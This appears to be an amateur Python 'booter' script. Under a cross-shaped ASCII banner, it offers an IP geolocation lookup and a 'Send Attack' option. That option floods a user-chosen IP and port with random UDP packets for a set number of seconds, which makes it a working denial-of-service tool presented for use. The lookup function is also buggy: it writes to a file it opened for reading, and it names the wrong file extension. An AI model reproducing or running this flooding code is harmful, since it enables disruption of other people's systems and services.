import os
import requests
import time
import random
import socket


def authorize():

  main()


def main():

  banner = f"""
             .======.
             | INRI |
             |      |
             |      |
    .========'      '========.
    |   _      xxxx      _   |
    |  /_;-.__ / _\  _.-;_\  |
    |     `-._`'`_/'`.-'     |
    '========.`\   /`========'
             | |  / |
             |/-.(  |
             |\_._\ |
             | \ \`;|
             |  > |/|
             | / // |
             | |//  |
             | \(\  |
             |  ``  |
             |      |
             |      |
             |      |
             |      |
 \\    _  _\\| \//  |//_   _ \// _
^ `^`^ ^`` `^ ^` ``^^`  `^^` `^ `^

IP-Lookup
Send Attack
Exit
    """

  print(f'Welcome Back obsidiandev\n{banner}')

  choice = input('[Codecity]')

  if choice == "IP-Lookup":

    geo_lookup()
  if choice == "Send Attack":
    os.system('cls||clear')

    send_attack()


def geo_lookup():

  banner = f"""

             .======.
             | INRI |
             |      |
             |      |
    .========'      '========.
    |   _      xxxx      _   |
    |  /_;-.__ / _\  _.-;_\  |
    |     `-._`'`_/'`.-'     |
    '========.`\   /`========'
             | |  / |
             |/-.(  |
             |\_._\ |
             | \ \`;|
             |  > |/|
             | / // |
             | |//  |
             | \(\  |
             |  ``  |
             |      |
             |      |
             |      |
             |      |
 \\    _  _\\| \//  |//_   _ \// _
^ `^`^ ^`` `^ ^` ``^^`  `^^` `^ `^

"""

  ip = input(f'IpV4: ')

  r = requests.get(f'https://ipinfo.io/{ip}')
  city = r.json()["city"]

  f = open(f'{ip}.text', 'r')

  f.write(f'City: {city} || IP: {ip}')
  input(f'Data found || data has been saved in || {ip}.txt')
  os.system('cls||clear')

  main()


def send_attack():

  print(f"""
             .======.
             | INRI |
             |      |
             |      |
    .========'      '========.
    |   _      xxxx      _   |
    |  /_;-.__ / _\  _.-;_\  |
    |     `-._`'`_/'`.-'     |
    '========.`\   /`========'
             | |  / |
             |/-.(  |
             |\_._\ |
             | \ \`;|
             |  > |/|
             | / // |
             | |//  |
             | \(\  |
             |  ``  |
             |      |
             |      |
             |      |
             |      |
 \\    _  _\\| \//  |//_   _ \// _
^ `^`^ ^`` `^ ^` ``^^`  `^^` `^ `^
          
          """)
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

  nano = ["1000", "2000", "3000", "4000", "5000", "6000", "7000", "8000"]
  nano = [value for value in nano if value.isdigit()]

  ip = input('Ip: ')
  port = int(input('port: '))

  timer = int(input('Attack time '))

  start_time = time.time()
  

  while (time.time() - start_time) < timer:
    s.connect((ip, port))
    chosen_nano = int(random.choice(nano))
    random_bytes = random._urandom(10)
    for _ in range(chosen_nano):
        s.send(random_bytes)

  os.system('cls||clear')

  print(f'System has been attacked for || {timer} Seconds || ')

  input('Press enter to go back to the main Menu... ')
  main()

  os.system('cls||clear')


authorize()
